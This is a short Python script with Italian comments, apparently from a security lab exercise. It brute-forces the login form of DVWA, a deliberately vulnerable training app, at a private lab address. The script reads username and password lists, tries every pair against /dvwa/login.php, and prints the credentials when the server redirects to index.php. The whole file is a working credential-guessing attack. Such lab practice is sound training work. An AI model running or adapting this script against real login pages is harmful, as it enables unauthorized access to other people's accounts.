import http.client, urllib.parse       #si importano i moduli

lista_username = open("usernames.lst") # definiamo le variabili con all'interno la lista degli usernames
lista_password = open("passwords.lst") # definiamo le variabili con all'interno la lista delle passwords

user = lista_username.readlines()      #copiamo il contenuto del file lista_username nella variabile user
password = lista_password.readlines()  #Facciamo lo stesso per il file lista_password nella variabile password.

for usr in user:                       #creiamo un ciclo che ci permette di usare le liste in password e in user 
    usr = usr.rstrip()
    for pwd in password:

        pwd = pwd.rstrip()

        print(usr, "-",pwd)            # mostra a schermo lo username e la password

        post_parameters = urllib.parse.urlencode({'username': usr, 'password': pwd, 'Login':"Login"})  
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml"} 
# qui sono stati definitii parametri necessari al funzionamento della libreria importata
        conn = http.client.HTTPConnection("192.168.50.101") #ci connettiamo all'indirizzo ip di riferimento con la porta di default 80         
        conn.request("POST", "/dvwa/login.php", post_parameters, headers) # raggruppiamo i parametri al comando CONN.REQUEST 
        response = conn.getresponse() # ci mettiamo in comunicazione con il server e ne raccogliamo la risposta

        if(response.getheader("location")) == "index.php": # se riusciamo ad accedere con le credenziali ci porta alla pagina di login
            print("Logged with: ", usr, " - ",pwd) # il programma ci avvisa che siamo riusciti a trovare le credenziali corrette e ce le printa
